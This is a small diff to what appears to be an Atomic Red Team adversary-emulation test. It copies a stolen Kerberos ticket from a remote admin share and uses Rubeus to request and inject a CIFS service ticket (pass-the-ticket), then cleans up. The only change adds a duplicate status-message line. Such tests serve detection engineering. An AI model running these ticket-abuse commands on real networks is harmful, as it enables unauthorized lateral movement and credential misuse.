@@ -98,6 +98,7 @@ atomic_tests:
       Set-Location $env:TEMP
       Move-Item -Force "\\#{target}\c$\ticket.kirbi" ticket.kirbi
       Write-Host "Successfully retrieved TGT from '#{target}', now requesting a TGS from local"
+      Write-Host "Successfully retrieved TGT from '#{target}', now requesting a TGS from local"
       cmd /c "#{rubeus_path}" asktgs /service:cifs/#{target} /ticket:ticket.kirbi /ptt
       Remove-Item $env:TEMP\ticket.kirbi
       cmd /c "#{rubeus_path}" purge      
